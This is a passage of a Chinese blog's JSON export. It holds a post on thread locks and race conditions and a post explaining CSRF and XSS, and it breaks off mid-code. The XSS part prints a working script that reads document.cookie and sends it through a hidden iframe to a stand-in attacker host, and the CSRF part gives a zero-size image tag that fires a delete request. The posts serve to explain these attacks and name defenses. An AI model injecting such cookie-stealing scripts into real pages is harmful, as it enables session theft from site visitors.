id=\"何爲锁？\"><a href=\"#何爲锁？\" class=\"headerlink\" title=\"何爲锁？\"></a>何爲锁？</h2><p><img src=\"1570974760163.png\" alt=\"\"></p>\n<p>如上面这张图所展示的，在运行多线程 Python 程序时，CPU 内只允许一个线程运行，开始运行其中一个线程时，一定要将「锁」住，不让其它线程运行。当要运行其它线程时，会打开锁，然后再执行第二个线程。如此一来，同一个 CPU 里，只允许一个线程运行。</p>\n<h2 id=\"爲何需要锁？\"><a href=\"#爲何需要锁？\" class=\"headerlink\" title=\"爲何需要锁？\"></a>爲何需要锁？</h2><p>当然，你也许会想：正常情况下，单核 CPU 也是一次运行一个线程，然后系统中断去执行其它线程，锁的意义何在啊？</p>\n<p>的确，系统中断是现代系统的基础，但也因爲它的存在，不得不使用锁。</p>\n<p>举个简单明了的例子。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 #include &lt;stdio.h&gt;</span><br><span class=\"line\">2 #include &lt;pthread.h&gt;</span><br><span class=\"line\">3 #include &quot;mythreads.h&quot;</span><br><span class=\"line\">4</span><br><span class=\"line\">5 static volatile int counter &#x3D; 0;</span><br><span class=\"line\">6</span><br><span class=\"line\">7 &#x2F;&#x2F;</span><br><span class=\"line\">8 &#x2F;&#x2F; mythread()</span><br><span class=\"line\">9 &#x2F;&#x2F;</span><br><span class=\"line\">10 &#x2F;&#x2F; 用循环将1加到1e7</span><br><span class=\"line\">11 &#x2F;&#x2F; 这不是展示如何使用线程</span><br><span class=\"line\">12 &#x2F;&#x2F; 而是表达线程的问题</span><br><span class=\"line\">13 &#x2F;&#x2F;</span><br><span class=\"line\">14 void *</span><br><span class=\"line\">15 mythread(void * arg)</span><br><span class=\"line\">16 &#123;</span><br><span class=\"line\">17 printf(&quot;%s: begin\\n&quot;, (char * ) arg);</span><br><span class=\"line\">18 int i;</span><br><span class=\"line\">19 for (i &#x3D; 0; i &lt; 1e7; i++) &#123;</span><br><span class=\"line\">20 counter &#x3D; counter + 1;</span><br><span class=\"line\">21 &#125;</span><br><span class=\"line\">22 printf(&quot;%s: done\\n&quot;, (char * ) arg);</span><br><span class=\"line\">23 return NULL;</span><br><span class=\"line\">24 &#125;</span><br><span class=\"line\">25</span><br><span class=\"line\">26 &#x2F;&#x2F;</span><br><span class=\"line\">27 &#x2F;&#x2F; main()</span><br><span class=\"line\">28 &#x2F;&#x2F;</span><br><span class=\"line\">29 &#x2F;&#x2F; 运行两个线程</span><br><span class=\"line\">30 &#x2F;&#x2F; 然后等待它们完成（Pthread_join）</span><br><span class=\"line\">31 &#x2F;&#x2F;</span><br><span class=\"line\">32 int</span><br><span class=\"line\">33 main(int argc, char * argv[])</span><br><span class=\"line\">34 &#123;</span><br><span class=\"line\">35 pthread_t p1, p2;</span><br><span class=\"line\">36 printf(&quot;main: begin (counter &#x3D; %d)\\n&quot;, counter);</span><br><span class=\"line\">37 Pthread_create(&amp;p1, NULL, mythread, &quot;A&quot;);</span><br><span class=\"line\">38 Pthread_create(&amp;p2, NULL, mythread, &quot;B&quot;);</span><br><span class=\"line\">39</span><br><span class=\"line\">40 &#x2F;&#x2F; join waits for the threads to finish</span><br><span class=\"line\">41 Pthread_join(p1, NULL);</span><br><span class=\"line\">42 Pthread_join(p2, NULL);</span><br><span class=\"line\">43 printf(&quot;main: done with both (counter &#x3D; %d)\\n&quot;, counter);</span><br><span class=\"line\">44 return 0;</span><br><span class=\"line\">45 &#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的这段代码，使用了两个线程操作一个全局变量 counter，每个线程都将它加到 1e7。可以预见，它最后的结果将是 2e7。可是，实际运行下来，并非如此。</p>\n<p><img src=\"1570974768741.png\" alt=\"\"></p>\n<p><img src=\"1570974768743.png\" alt=\"\"></p>\n<p><img src=\"1570974769063.png\" alt=\"\"></p>\n<p>三次运行下来，结果完全不同。</p>\n<p>这违反了我们的直觉。明明同一段代码，操作同一个变量，爲什麽出来了完全不同的答案？</p>\n<p>原因不难解释，我们先来看看 X86 架构下 加法 操作对应的汇编代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov 0xabcde, %eax</span><br><span class=\"line\">add 0x1, %eax</span><br><span class=\"line\">mov %eax, 0xabcde</span><br></pre></td></tr></table></figure>\n\n<p>在计算机中，加法操作分成三部分。</p>\n<ol>\n<li>将被加数放进 寄存器</li>\n<li>对 寄存器 进行加法</li>\n<li>将 寄存器 里的数字放到原先被加数的地址</li>\n</ol>\n<p>问题也就出在这三部操作这里。抢佔调度发生时，它可不管你在做什麽。很可能就会发生下面的情景。</p>\n<ul>\n<li><p>counter = 6</p>\n</li>\n<li><p>add 0x1, %eax (此时 %eax 变成了 7，但并没有存到 counter )</p>\n</li>\n<li><p>CPU 被抢佔</p>\n</li>\n<li><p>第二个线程做完加法，counter = 7</p>\n</li>\n<li><p>恢復到第一个线程，将 %eax 的 7 存到 counter</p>\n</li>\n<li><p>counter = 7</p>\n</li>\n</ul>\n<p>注意，我们 的 counter 两次加 1，却只从 6 变到 7！</p>\n<p>正是由于系统中断，使得本应一次完成的事情，分成了两次完成，造成了数据的两次计算。这也是问题的最大根原。</p>\n<p>爲此，我们必须考虑：在进行某些操作时，避免因中断（切换上下文 ）导致原子性问题。<br>如何锁</p>\n<p>由于原子性问题是因中断导致的，在不引入新的指令前，最先想到的办法就是：在执行一些重要操作时，干掉中断！比如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int faker()&#123;</span><br><span class=\"line\">    lock();</span><br><span class=\"line\">    a &#x3D; a + 1;</span><br><span class=\"line\">    unlock();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在执行 lock 之后，干掉中断，执行完后面的代码之后，再 unlock，打开中断。大略一看，是不错的想法。但别忘了我们最初设计中断的原因。是要避免下面这种情况：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int loop_function()&#123;</span><br><span class=\"line\">    lock();</span><br><span class=\"line\">    while(1)&#123;</span><br><span class=\"line\">        do_something();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unlock();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>显然，一旦某个大坏蛋（或者二伍仔）写了上面的代码，除了关机，没任何办法可以夺回 CPU 了。更何况，关掉中断只能关掉当前的处理器，其它的处理器依然会中断，然后搞坏计算结果。关掉中断真是个糟透的想法。</p>\n<p>那换个想法，但无限循环这个办法可以用在我们接下来的设计上。(爲了方便，我使用 python 改写教材里的示例，这段代码在 python 中没有多少意义)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class lock_t():</span><br><span class=\"line\">    def init(self):</span><br><span class=\"line\">        self.flag &#x3D; 0</span><br><span class=\"line\"></span><br><span class=\"line\">def init(mutex):</span><br><span class=\"line\">    mutex.flag &#x3D; 0</span><br><span class=\"line\">    </span><br><span class=\"line\">def lock(mutex):</span><br><span class=\"line\">    while (mutex.flag &#x3D;&#x3D; 1):</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    mutex.flag &#x3D; 1</span><br><span class=\"line\">    </span><br><span class=\"line\">def unlock(mutex):</span><br><span class=\"line\">    mutex.flag &#x3D; 0</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码是定义锁的「锁」、「开锁」功能。现在假设线程 A 在运行，它准备做一个原子操作，同时 mutex 对象是全局对象。那麽，代码可能是这样的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def do():</span><br><span class=\"line\">    lock(mutex) # A 线程执行到这里</span><br><span class=\"line\">    a &#x3D; a+1</span><br><span class=\"line\">    unlock(mutex)</span><br></pre></td></tr></table></figure>\n\n<p>此时，线程 B 夺得了 CPU 的使用权。它也会执行 lock(mutex)。但它运行到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while (mutex.flag &#x3D;&#x3D; 1)</span><br></pre></td></tr></table></figure>\n\n<p>时，因爲 A 已经先执行了，所以 mute.flag 已经是 1 了。在 B 运行期间，因爲 mutex.flag 是 1 的原故，它被困在了 while loop 里。</p>\n<p>然后等到 A 夺回 CPU 使用权。A 做完 a = a+1，然后 unlock(mutex)，mutex.flag 变回了 0。此时，假设 B 又夺到了 CPU 使用权。mutex.flag 已经是 0 了，从 while loop 里跳出。。。</p>\n<p>就这样，一个简单的锁就完成了。</p>\n<p>但，真的一点问题也没有吗？</p>\n","site":{"data":{}},"excerpt":"<p>以前在阅读有关于 Python 性能的文章时，总是有人提到「僞线程」和「线程锁」这两个词。由于基础不够，当有人提到 Python 性能时，我也只能学着他们，说「Python 是僞线程啦！不行啦！」之类的话。但是，印在我股子里的装B劲，还是渴望有一天能理解，究竟何爲「锁」？爲何需要「锁」？如何「锁」？以及「GIL的问题」。</p>","more":"<h2 id=\"何爲锁？\"><a href=\"#何爲锁？\" class=\"headerlink\" title=\"何爲锁？\"></a>何爲锁？</h2><p><img src=\"1570974760163.png\" alt=\"\"></p>\n<p>如上面这张图所展示的，在运行多线程 Python 程序时，CPU 内只允许一个线程运行，开始运行其中一个线程时，一定要将「锁」住，不让其它线程运行。当要运行其它线程时，会打开锁，然后再执行第二个线程。如此一来，同一个 CPU 里，只允许一个线程运行。</p>\n<h2 id=\"爲何需要锁？\"><a href=\"#爲何需要锁？\" class=\"headerlink\" title=\"爲何需要锁？\"></a>爲何需要锁？</h2><p>当然，你也许会想：正常情况下，单核 CPU 也是一次运行一个线程，然后系统中断去执行其它线程，锁的意义何在啊？</p>\n<p>的确，系统中断是现代系统的基础，但也因爲它的存在，不得不使用锁。</p>\n<p>举个简单明了的例子。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 #include &lt;stdio.h&gt;</span><br><span class=\"line\">2 #include &lt;pthread.h&gt;</span><br><span class=\"line\">3 #include &quot;mythreads.h&quot;</span><br><span class=\"line\">4</span><br><span class=\"line\">5 static volatile int counter &#x3D; 0;</span><br><span class=\"line\">6</span><br><span class=\"line\">7 &#x2F;&#x2F;</span><br><span class=\"line\">8 &#x2F;&#x2F; mythread()</span><br><span class=\"line\">9 &#x2F;&#x2F;</span><br><span class=\"line\">10 &#x2F;&#x2F; 用循环将1加到1e7</span><br><span class=\"line\">11 &#x2F;&#x2F; 这不是展示如何使用线程</span><br><span class=\"line\">12 &#x2F;&#x2F; 而是表达线程的问题</span><br><span class=\"line\">13 &#x2F;&#x2F;</span><br><span class=\"line\">14 void *</span><br><span class=\"line\">15 mythread(void * arg)</span><br><span class=\"line\">16 &#123;</span><br><span class=\"line\">17 printf(&quot;%s: begin\\n&quot;, (char * ) arg);</span><br><span class=\"line\">18 int i;</span><br><span class=\"line\">19 for (i &#x3D; 0; i &lt; 1e7; i++) &#123;</span><br><span class=\"line\">20 counter &#x3D; counter + 1;</span><br><span class=\"line\">21 &#125;</span><br><span class=\"line\">22 printf(&quot;%s: done\\n&quot;, (char * ) arg);</span><br><span class=\"line\">23 return NULL;</span><br><span class=\"line\">24 &#125;</span><br><span class=\"line\">25</span><br><span class=\"line\">26 &#x2F;&#x2F;</span><br><span class=\"line\">27 &#x2F;&#x2F; main()</span><br><span class=\"line\">28 &#x2F;&#x2F;</span><br><span class=\"line\">29 &#x2F;&#x2F; 运行两个线程</span><br><span class=\"line\">30 &#x2F;&#x2F; 然后等待它们完成（Pthread_join）</span><br><span class=\"line\">31 &#x2F;&#x2F;</span><br><span class=\"line\">32 int</span><br><span class=\"line\">33 main(int argc, char * argv[])</span><br><span class=\"line\">34 &#123;</span><br><span class=\"line\">35 pthread_t p1, p2;</span><br><span class=\"line\">36 printf(&quot;main: begin (counter &#x3D; %d)\\n&quot;, counter);</span><br><span class=\"line\">37 Pthread_create(&amp;p1, NULL, mythread, &quot;A&quot;);</span><br><span class=\"line\">38 Pthread_create(&amp;p2, NULL, mythread, &quot;B&quot;);</span><br><span class=\"line\">39</span><br><span class=\"line\">40 &#x2F;&#x2F; join waits for the threads to finish</span><br><span class=\"line\">41 Pthread_join(p1, NULL);</span><br><span class=\"line\">42 Pthread_join(p2, NULL);</span><br><span class=\"line\">43 printf(&quot;main: done with both (counter &#x3D; %d)\\n&quot;, counter);</span><br><span class=\"line\">44 return 0;</span><br><span class=\"line\">45 &#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的这段代码，使用了两个线程操作一个全局变量 counter，每个线程都将它加到 1e7。可以预见，它最后的结果将是 2e7。可是，实际运行下来，并非如此。</p>\n<p><img src=\"1570974768741.png\" alt=\"\"></p>\n<p><img src=\"1570974768743.png\" alt=\"\"></p>\n<p><img src=\"1570974769063.png\" alt=\"\"></p>\n<p>三次运行下来，结果完全不同。</p>\n<p>这违反了我们的直觉。明明同一段代码，操作同一个变量，爲什麽出来了完全不同的答案？</p>\n<p>原因不难解释，我们先来看看 X86 架构下 加法 操作对应的汇编代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov 0xabcde, %eax</span><br><span class=\"line\">add 0x1, %eax</span><br><span class=\"line\">mov %eax, 0xabcde</span><br></pre></td></tr></table></figure>\n\n<p>在计算机中，加法操作分成三部分。</p>\n<ol>\n<li>将被加数放进 寄存器</li>\n<li>对 寄存器 进行加法</li>\n<li>将 寄存器 里的数字放到原先被加数的地址</li>\n</ol>\n<p>问题也就出在这三部操作这里。抢佔调度发生时，它可不管你在做什麽。很可能就会发生下面的情景。</p>\n<ul>\n<li><p>counter = 6</p>\n</li>\n<li><p>add 0x1, %eax (此时 %eax 变成了 7，但并没有存到 counter )</p>\n</li>\n<li><p>CPU 被抢佔</p>\n</li>\n<li><p>第二个线程做完加法，counter = 7</p>\n</li>\n<li><p>恢復到第一个线程，将 %eax 的 7 存到 counter</p>\n</li>\n<li><p>counter = 7</p>\n</li>\n</ul>\n<p>注意，我们 的 counter 两次加 1，却只从 6 变到 7！</p>\n<p>正是由于系统中断，使得本应一次完成的事情，分成了两次完成，造成了数据的两次计算。这也是问题的最大根原。</p>\n<p>爲此，我们必须考虑：在进行某些操作时，避免因中断（切换上下文 ）导致原子性问题。<br>如何锁</p>\n<p>由于原子性问题是因中断导致的，在不引入新的指令前，最先想到的办法就是：在执行一些重要操作时，干掉中断！比如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int faker()&#123;</span><br><span class=\"line\">    lock();</span><br><span class=\"line\">    a &#x3D; a + 1;</span><br><span class=\"line\">    unlock();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在执行 lock 之后，干掉中断，执行完后面的代码之后，再 unlock，打开中断。大略一看，是不错的想法。但别忘了我们最初设计中断的原因。是要避免下面这种情况：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int loop_function()&#123;</span><br><span class=\"line\">    lock();</span><br><span class=\"line\">    while(1)&#123;</span><br><span class=\"line\">        do_something();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unlock();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>显然，一旦某个大坏蛋（或者二伍仔）写了上面的代码，除了关机，没任何办法可以夺回 CPU 了。更何况，关掉中断只能关掉当前的处理器，其它的处理器依然会中断，然后搞坏计算结果。关掉中断真是个糟透的想法。</p>\n<p>那换个想法，但无限循环这个办法可以用在我们接下来的设计上。(爲了方便，我使用 python 改写教材里的示例，这段代码在 python 中没有多少意义)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class lock_t():</span><br><span class=\"line\">    def init(self):</span><br><span class=\"line\">        self.flag &#x3D; 0</span><br><span class=\"line\"></span><br><span class=\"line\">def init(mutex):</span><br><span class=\"line\">    mutex.flag &#x3D; 0</span><br><span class=\"line\">    </span><br><span class=\"line\">def lock(mutex):</span><br><span class=\"line\">    while (mutex.flag &#x3D;&#x3D; 1):</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    mutex.flag &#x3D; 1</span><br><span class=\"line\">    </span><br><span class=\"line\">def unlock(mutex):</span><br><span class=\"line\">    mutex.flag &#x3D; 0</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码是定义锁的「锁」、「开锁」功能。现在假设线程 A 在运行，它准备做一个原子操作，同时 mutex 对象是全局对象。那麽，代码可能是这样的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def do():</span><br><span class=\"line\">    lock(mutex) # A 线程执行到这里</span><br><span class=\"line\">    a &#x3D; a+1</span><br><span class=\"line\">    unlock(mutex)</span><br></pre></td></tr></table></figure>\n\n<p>此时，线程 B 夺得了 CPU 的使用权。它也会执行 lock(mutex)。但它运行到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while (mutex.flag &#x3D;&#x3D; 1)</span><br></pre></td></tr></table></figure>\n\n<p>时，因爲 A 已经先执行了，所以 mute.flag 已经是 1 了。在 B 运行期间，因爲 mutex.flag 是 1 的原故，它被困在了 while loop 里。</p>\n<p>然后等到 A 夺回 CPU 使用权。A 做完 a = a+1，然后 unlock(mutex)，mutex.flag 变回了 0。此时，假设 B 又夺到了 CPU 使用权。mutex.flag 已经是 0 了，从 while loop 里跳出。。。</p>\n<p>就这样，一个简单的锁就完成了。</p>\n<p>但，真的一点问题也没有吗？</p>"},{"title":"CSRF 和 XSS","date":"2019-10-26T16:00:00.000Z","_content":"\n最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。\n\n<!-- more -->\n\n说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？\n\n不过，我还是想做个简短的笔记，来回忆这几天的想法。\n\n## 什麽是 CSRF\n\nCrossing Site Request Forgery，跨站请求僞造。是一种利用 Cookies 进行攻击的方式。\n\n在解释 CSRF 前，我们先来了解一下 Cookies 和 Sessions。由于 HTTP 的无状态机制，任意两个网页之间都是无关联的。爲了让它们产生关联，诞生了 sessions 和 cookies。当我们打开网站时，都是一个会话(sessions)，浏览器会临时保存这个 sessions，服务器靠着 sessions 来识别衆多用户中谁是谁，正因爲 浏览器 保存着 sessions，服务器才有能力辨识，当前访问的用户是 A 不是 B。浏览器被关闭后，就会消去 sessions。而 cookies 是保存得更久一点的方法，即使浏览器关掉后，也会保留一段时间。\n\n大坏蛋就利用这两个机制，发起了 CSRF。\n\n举个简单的例子。小明在 A 网站（http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了 Cookies，当访问该网站的下一个页面是，就会连同 Cookies 一同发出。之后小明发表了一篇 id 爲 3 的论文。大坏蛋的 B 网站里，有一张图片是这样的。\n\n```\n<img src='https://A/delete?id=3' width='0' height='0' />\n```\n\n这段代码表示，在网页上显示长宽爲 0 的图片。虽然长宽爲 0，小明看不到，但浏览器却能看到，它会尝试访问 A 网站，并执行删除操作，将 id 爲 3 的文章删了。\n\n如果是其它人的浏览器，访问了也就访问了，他们的浏览器访问 https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有 cookies，没有登录，拒决了访问。\n\n但对小明而言，这就是大问题了。小明的浏览器会访问 https://A/delete?id=3，然后将 A 网站的 Cookies 也一併伟过去。这个请求被A 网站的服备器收到，它们验证 Cookies，也没问题，是小明本人发过来的，那就执行删除操作吧。\n\n于是，小明在不明不白的情况下，将自己发表在 A 网站上的文章删除了。\n\nCSRF 是利用了用户对浏览器的信任，进行了攻击。XSS 和 CSRF 很像，但利用的是用户的另一个弱点。\n\n## 什麽是XSS\n\n和上面的方法很相似，攻击者在通过代码注入的形式，将攻击代码写入网页。\n\n但它并非进行 CSRF 攻击，而是通过 JS 代码，获取打开网页的用户 cookies。\n\n还是个简单的例子。\n\n小明吸取了教训，在登录其它网站前，会登出 A 网站的用户，只有在访问 A 网站时，才会登录。\n\n然而攻击者 小坏蛋 在 A 网站发表了一篇文章，然后在文章里注入\n\n```\n// 用 <script type=\"text/javascript\"></script> 包起来放在文章中\n(function(window, document) {\n    var cookies = document.cookie;\n    var xssURIBase = \"http://小坏蛋的IP/myxss/\";\n    var xssURI = xssURIBase + window.encodeURI(cookies);\n    // 建立隐藏 iframe 用于通讯\n    var hideFrame = document.createElement(\"iframe\");\n    hideFrame.height = 0;\n    hideFrame.width = 0;\n    hideFrame.style.display = \"none\";\n    hideFrame.src = xssURI;\n    document.body.appendChild(hideFrame);\n})(window, document);\n```\n\n明面上，这篇文章没什麽问题，因爲 iframe 被隐藏了。但只要有人点开，就会触发上面的代码，将 cookies 发送到小坏蛋的网站。小坏蛋就获得了其他人的身份，大摇大摆的删除文章了。\n\n与 CSRF 不同，这一次，小明并没有上不正规的网站，他浏览的是正规的 A 的网站，却依旧遭到了攻击。这一次，攻击的是 小明 对网站的信任。\n\n---\n\n所以，有些时候，我们不能将用户受到网络攻击，归到他们不注重自身安全（虽然很大一部分时间的确是这样的）。用户更多时候，是没有能力保证安全的，即使再注意，不上小网站，也会遭到 XSS 攻击。\n\n因此在设计一个系统，一个网站时，我们要加强系统本身的抗打击能力。比如对付 CSRF，就验证访问源，使用 JWT 替代 cookies；对付 XSS，用过滤，警惕自己的用户。\n\n道高一尺，魔高一丈。最近看了关于网络安全方面的文章，觉得自己还有很长的路要走。\n","source":"_posts/CSRF-和-XSS.md","raw":"---\ntitle: CSRF 和 XSS\ndate: 2019-10-27\ntags:\n---\n\n最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。\n\n<!-- more -->\n\n说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？\n\n不过，我还是想做个简短的笔记，来回忆这几天的想法。\n\n## 什麽是 CSRF\n\nCrossing Site Request Forgery，跨站请求僞造。是一种利用 Cookies 进行攻击的方式。\n\n在解释 CSRF 前，我们先来了解一下 Cookies 和 Sessions。由于 HTTP 的无状态机制，任意两个网页之间都是无关联的。爲了让它们产生关联，诞生了 sessions 和 cookies。当我们打开网站时，都是一个会话(sessions)，浏览器会临时保存这个 sessions，服务器靠着 sessions 来识别衆多用户中谁是谁，正因爲 浏览器 保存着 sessions，服务器才有能力辨识，当前访问的用户是 A 不是 B。浏览器被关闭后，就会消去 sessions。而 cookies 是保存得更久一点的方法，即使浏览器关掉后，也会保留一段时间。\n\n大坏蛋就利用这两个机制，发起了 CSRF。\n\n举个简单的例子。小明在 A 网站（http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了 Cookies，当访问该网站的下一个页面是，就会连同 Cookies 一同发出。之后小明发表了一篇 id 爲 3 的论文。大坏蛋的 B 网站里，有一张图片是这样的。\n\n```\n<img src='https://A/delete?id=3' width='0' height='0' />\n```\n\n这段代码表示，在网页上显示长宽爲 0 的图片。虽然长宽爲 0，小明看不到，但浏览器却能看到，它会尝试访问 A 网站，并执行删除操作，将 id 爲 3 的文章删了。\n\n如果是其它人的浏览器，访问了也就访问了，他们的浏览器访问 https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有 cookies，没有登录，拒决了访问。\n\n但对小明而言，这就是大问题了。小明的浏览器会访问 https://A/delete?id=3，然后将 A 网站的 Cookies 也一併伟过去。这个请求被A 网站的服备器收到，它们验证 Cookies，也没问题，是小明本人发过来的，那就执行删除操作吧。\n\n于是，小明在不明不白的情况下，将自己发表在 A 网站上的文章删除了。\n\nCSRF 是利用了用户对浏览器的信任，进行了攻击。XSS 和 CSRF 很像，但利用的是用户的另一个弱点。\n\n## 什麽是XSS\n\n和上面的方法很相似，攻击者在通过代码注入的形式，将攻击代码写入网页。\n\n但它并非进行 CSRF 攻击，而是通过 JS 代码，获取打开网页的用户 cookies。\n\n还是个简单的例子。\n\n小明吸取了教训，在登录其它网站前，会登出 A 网站的用户，只有在访问 A 网站时，才会登录。\n\n然而攻击者 小坏蛋 在 A 网站发表了一篇文章，然后在文章里注入\n\n```\n// 用 <script type=\"text/javascript\"></script> 包起来放在文章中\n(function(window, document) {\n    var cookies = document.cookie;\n    var xssURIBase = \"http://小坏蛋的IP/myxss/\";\n    var xssURI = xssURIBase + window.encodeURI(cookies);\n    // 建立隐藏 iframe 用于通讯\n    var hideFrame = document.createElement(\"iframe\");\n    hideFrame.height = 0;\n    hideFrame.width = 0;\n    hideFrame.style.display = \"none\";\n    hideFrame.src = xssURI;\n    document.body.appendChild(hideFrame);\n})(window, 